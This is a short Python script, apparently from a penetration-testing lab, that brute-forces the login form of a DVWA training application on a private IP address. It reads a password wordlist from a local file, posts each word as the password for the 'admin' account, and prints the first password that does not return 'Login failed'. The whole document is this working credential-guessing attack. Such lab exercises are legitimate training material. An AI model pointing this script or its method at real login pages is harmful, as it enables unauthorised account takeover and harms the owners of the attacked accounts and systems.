#!/usr/bin/env python
# using python to send a post request to websites.

import requests

target_url = "http://192.168.110.155/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/root/Downloads/passwords.txt", "r") as file:
    for line in file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Discovered password --> " + word)
            exit()
print("Reach end of line.")



